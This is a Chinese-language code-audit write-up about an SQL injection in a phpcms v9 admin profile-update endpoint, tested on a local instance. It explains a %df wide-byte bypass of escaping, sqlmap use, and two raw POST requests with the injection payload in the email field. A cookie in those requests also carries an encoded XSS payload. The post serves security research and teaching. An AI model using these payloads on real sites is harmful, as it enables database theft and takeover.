cms sql注入代码审计  
审计工具  
seasy源代码审计系统  
Phpstudy 8.1.1.2

审计步骤  
在cms中默认对输入的数据进行转义

通过对代码审计发现一处在对用户信息更新时未对字符进行严格过滤导致的sql注入  
在更新用户信息处直接获取输入的info数据带入数据库查询  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0590a04c264b74151858e4bd3ffd89bbcf2cce59.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0590a04c264b74151858e4bd3ffd89bbcf2cce59.png)  
在这里接着向上搜索看到调用的是admin\_model这个模型，继续查找该模型  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-418091525e53797ef15a6c726d7995f3e35bc629.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-418091525e53797ef15a6c726d7995f3e35bc629.png)  
找到admin\_model模型，其实例化一个类model。向上查找model类

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d27d9c6ba44bc720ac5a725c307ba2c441df2cc5.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d27d9c6ba44bc720ac5a725c307ba2c441df2cc5.png)

在model中定义了数据库的基本操作，找到我们需要的update方法，同样这一又调用了一个类。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-16d864b5ad81d1cc2cc711d9ab7fa62bb5d27e92.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-16d864b5ad81d1cc2cc711d9ab7fa62bb5d27e92.png)

在这里可以看到调用的是db\_factory类对数据库进行操作，继续跟踪该类。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1dc6509fa8620f16f67bcc75f5e3501e1cb243b4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1dc6509fa8620f16f67bcc75f5e3501e1cb243b4.png)  
在db\_factory类中定义了数据库的相关信息以及加载了一个类mysql来对数据库的查询语句进行查询。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b7ab656efe0131ec99c877d7735a051fd0052d9c.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b7ab656efe0131ec99c877d7735a051fd0052d9c.png)  
找到mysql\_class类中，找到我们需要的update方法。在该方法中调用escape\_string对输入的数据进行过滤。向上搜索escape\_string方法。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ac37231c81ae23096e02bcd90aff1d26c9fa57d3.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-ac37231c81ae23096e02bcd90aff1d26c9fa57d3.png)  
找到escape方法，发现对输入的数据没有做过滤操作。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-24b7cbb0bb0ca5bbc9358c280c516fdbafac6f4d.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-24b7cbb0bb0ca5bbc9358c280c516fdbafac6f4d.png)  
将返回的数据库查询语句带入execute进行查询。  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-dbda6eb51a0f63026f1349b1723232df0fff1ff7.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-dbda6eb51a0f63026f1349b1723232df0fff1ff7.png)  
在这里可以看到存在注入，由于cms对输入自动默认转义，所以需要对转义进

注入实现  
行绕过即是用宽字节的方法吃掉转义符号\\，即是使用%df进行绕过。  
接下来本地搭建环境使用管理员进行登录  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1e8f38699d02915372b7a673ee275cae48b0151b.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1e8f38699d02915372b7a673ee275cae48b0151b.png)

提交修改数据，由于在邮箱处的数据在前端存在格式要求，于是进行抓包修改email的数据，在email的数据后面添加%df’ 使得查询语句成功报错。  
由于是后台注入，即是需要提供管理员的登录cookie  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1fc128eeb777cd83e8a5faa15408a6edcc3321d6.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1fc128eeb777cd83e8a5faa15408a6edcc3321d6.png)

于是去掉’将数据包写入POST.txt使用sqlmap进行工具自动化注入。

成功注入，获取到了当前的数据库名称phpcmsv9  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-46abe67d968b8235eb8c4aa46a777b0a0e7b95b4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-46abe67d968b8235eb8c4aa46a777b0a0e7b95b4.png)

报错回显数据包  
POST /index.php?m=admin&amp;c=admin\_manage&amp;a=public\_edit\_info HTTP/1.1  
Host: 127.0.0.1:8093  
User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4464.5 Safari/537.36  
Accept: text/html,application/xhtml+x ml,application/x ml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 157  
Origin: <http://127.0.0.1:8093>  
Connection: close  
Referer: [http://127.0.0.1:8093/index.php?m=admin&amp;c=admin\_manage&amp;a=public\_edit\_info&amp;menuid=972&amp;pc\_hash=G9EuRQ](http://127.0.0.1:8093/index.php?m=admin&c=admin_manage&a=public_edit_info&menuid=972&pc_hash=G9EuRQ)  
Cookie: PHPSESSID=v0k1udcnitupj9d52qcjjiab74; yzmphp\_adminid=07ce0qT4pwrMxE0QioXhznmSqzn9xvX-wS6roZVM; yzmphp\_adminname=96f3fyXUcF4vbSOyFlmsmJJ8ZLOiYTC2PyrWgUSuLvZM7L0; yzmphp**userid=95d1JBGLHsq7c\_H5MnQCOKOq0aF9Qsx6J2fom0Zu; yzmphp\_\_username=723bYEGbfwpBAAUrcunS5jJfVjXmidic2APVLMMijCPC\_w; yzmphp**groupid=0bfe4XTEl4nS-XVAQr92HsD\_5dTTBuftMjucTvPF; yzmphp**nickname=ef75MiizaYw-1pOtVKekYUGWSdQVtlCPPu9gvomBbsxMnQ; TffoQ\_siteid=333erUtfR7Fe5Jw28wZJETYBElboNmp1ET0UFRpd; TffoQ\_admin\_email=2d34ilHVoG\_P9QUdQNq8FvZ4pqgJDuaull1SYafs0eTQC1quNmRA; TffoQ\_sys\_lang=98dcWC54M\_XkuMYkIEFf5NWMjbi-\_1gMJ21AHPTIh6rI3Q; TffoQ\_module=d88146WmoR4F0Tv\_hzGkNaAxC-GlinO1sIu8pJ2Us0mpGDhk; TffoQ\_catid=cb92ksUsFPQ8RwENCVgtODGrZdbqAtEKD7mAZctF; treeview-black=0; sYQDUGqqzHsearch\_history=%26quot%26gt%3B%26lt%3BIMG%20SRC%3DA%20o nerror%3Da lert%28/xs/%29%26gt%3B%26lt%3B%26quot%7C1%2C1%7C1%2C%26quot%7C1; TffoQ\_admin\_username=ae3czGm1cWj9M9syw3EdExmONEZuP8cifNhQx22kLeVezks; TffoQ\_userid=bb58JlspltYeM05GfmUeeBAOOobm3ebDNML-ut-6; oGHAM\_siteid=a4d1a9zqsKRzNCgWRMu9wUSyrPkbjpRAuCJZ-**h; oGHAM\_admin\_email=9ac3BGQkprHXpx0ieYuguoeT7Hy3EjrfXbm8R8hup6Ecx073IRU; oGHAM\_sys\_lang=f1b12Ej8rfCmO-sJbOaCStoR0WjaNd91m0QjjuFZ7yIOMQ; VLmUN\_admin\_username=75284kMEhTsq7wjBD-l1l2kyiL75vi8ni6tCfdbuBOCZU48; VLmUN\_siteid=acc4rXwB3hHEcw-coAM-xYe2824cipgGyA6fE-dL; VLmUN\_userid=b5b3mf4bydL77FC34TTKRHFXcCZQi5r\_8xkohJ5l; VLmUN\_admin\_email=a60agMFhN7xqheohRH5nKCaqQ6bFId0jOwqb-hmQF-mbAg7gE5Y; VLmUN\_sys\_lang=8fa0qIbrI3bl3lgF6HJ4jVZsuDWJMW6Eok82-Incda4TrA; VOrQw\_admin\_username=5f934p\_CrF2\_PkwMpMfCodD3dvfbWPS7WwU4LYGEFStV-xc; VOrQw\_siteid=67ec\_Tu3aq37MeFwk3Kgan1FkgJnTKtShq34epex; VOrQw\_userid=a4fb7ZyRo25av3MLW4OEfvGlflYmTcipsJC4uunm; VOrQw\_admin\_email=a979\_GifxnWPS-KIS\_i0jqtSfmRv0TDSg79rQm7-GDHAh01pUt0; VOrQw\_sys\_lang=80dfQ-tsnMhqOcFTS\_kEPoP5uZU8iuO9p\_3C5gcmKEY30Q  
Upgrade-Insecure-Requests: 1  
X-Forwarded-For: 127.0.0.1

info%5Buserid%5D=1&amp;info%5Busername%5D=phpcms&amp;info%5Brealname%5D=123&amp;info%5Bemail%5D=12%4012.com%df'&amp;info%5Blang%5D=zh-cn&amp;dosubmit=%CC%E1%BD%BB&amp;pc\_hash=G9EuRQ

注入数据包

POST /index.php?m=admin&amp;c=admin\_manage&amp;a=public\_edit\_info HTTP/1.1  
Host: 127.0.0.1:8093  
User-Agent: Mozilla/5.0 (X11; Linux x86\_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4464.5 Safari/537.36  
Accept: text/html,application/xhtml+x ml,application/x ml;q=0.9,image/webp,*/*;q=0.8  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 157  
Origin: <http://127.0.0.1:8093>  
Connection: close  
Referer: [http://127.0.0.1:8093/index.php?m=admin&amp;c=admin\_manage&amp;a=public\_edit\_info&amp;menuid=972&amp;pc\_hash=G9EuRQ](http://127.0.0.1:8093/index.php?m=admin&c=admin_manage&a=public_edit_info&menuid=972&pc_hash=G9EuRQ)  
Cookie: PHPSESSID=v0k1udcnitupj9d52qcjjiab74; yzmphp\_adminid=07ce0qT4pwrMxE0QioXhznmSqzn9xvX-wS6roZVM; yzmphp\_adminname=96f3fyXUcF4vbSOyFlmsmJJ8ZLOiYTC2PyrWgUSuLvZM7L0; yzmphp**userid=95d1JBGLHsq7c\_H5MnQCOKOq0aF9Qsx6J2fom0Zu; yzmphp\_\_username=723bYEGbfwpBAAUrcunS5jJfVjXmidic2APVLMMijCPC\_w; yzmphp**groupid=0bfe4XTEl4nS-XVAQr92HsD\_5dTTBuftMjucTvPF; yzmphp**nickname=ef75MiizaYw-1pOtVKekYUGWSdQVtlCPPu9gvomBbsxMnQ; TffoQ\_siteid=333erUtfR7Fe5Jw28wZJETYBElboNmp1ET0UFRpd; TffoQ\_admin\_email=2d34ilHVoG\_P9QUdQNq8FvZ4pqgJDuaull1SYafs0eTQC1quNmRA; TffoQ\_sys\_lang=98dcWC54M\_XkuMYkIEFf5NWMjbi-\_1gMJ21AHPTIh6rI3Q; TffoQ\_module=d88146WmoR4F0Tv\_hzGkNaAxC-GlinO1sIu8pJ2Us0mpGDhk; TffoQ\_catid=cb92ksUsFPQ8RwENCVgtODGrZdbqAtEKD7mAZctF; treeview-black=0; sYQDUGqqzHsearch\_history=%26quot%26gt%3B%26lt%3BIMG%20SRC%3DA%20o nerror%3Da lert%28/xs/%29%26gt%3B%26lt%3B%26quot%7C1%2C1%7C1%2C%26quot%7C1; TffoQ\_admin\_username=ae3czGm1cWj9M9syw3EdExmONEZuP8cifNhQx22kLeVezks; TffoQ\_userid=bb58JlspltYeM05GfmUeeBAOOobm3ebDNML-ut-6; oGHAM\_siteid=a4d1a9zqsKRzNCgWRMu9wUSyrPkbjpRAuCJZ-**h; oGHAM\_admin\_email=9ac3BGQkprHXpx0ieYuguoeT7Hy3EjrfXbm8R8hup6Ecx073IRU; oGHAM\_sys\_lang=f1b12Ej8rfCmO-sJbOaCStoR0WjaNd91m0QjjuFZ7yIOMQ; VLmUN\_admin\_username=75284kMEhTsq7wjBD-l1l2kyiL75vi8ni6tCfdbuBOCZU48; VLmUN\_siteid=acc4rXwB3hHEcw-coAM-xYe2824cipgGyA6fE-dL; VLmUN\_userid=b5b3mf4bydL77FC34TTKRHFXcCZQi5r\_8xkohJ5l; VLmUN\_admin\_email=a60agMFhN7xqheohRH5nKCaqQ6bFId0jOwqb-hmQF-mbAg7gE5Y; VLmUN\_sys\_lang=8fa0qIbrI3bl3lgF6HJ4jVZsuDWJMW6Eok82-Incda4TrA; VOrQw\_admin\_username=5f934p\_CrF2\_PkwMpMfCodD3dvfbWPS7WwU4LYGEFStV-xc; VOrQw\_siteid=67ec\_Tu3aq37MeFwk3Kgan1FkgJnTKtShq34epex; VOrQw\_userid=a4fb7ZyRo25av3MLW4OEfvGlflYmTcipsJC4uunm; VOrQw\_admin\_email=a979\_GifxnWPS-KIS\_i0jqtSfmRv0TDSg79rQm7-GDHAh01pUt0; VOrQw\_sys\_lang=80dfQ-tsnMhqOcFTS\_kEPoP5uZU8iuO9p\_3C5gcmKEY30Q  
Upgrade-Insecure-Requests: 1  
X-Forwarded-For: 127.0.0.1

info%5Buserid%5D=1&amp;info%5Busername%5D=phpcms&amp;info%5Brealname%5D=123&amp;info%5Bemail%5D=12%4012.com%df&amp;info%5Blang%5D=zh-cn&amp;dosubmit=%CC%E1%BD%BB&amp;pc\_hash=G9EuRQ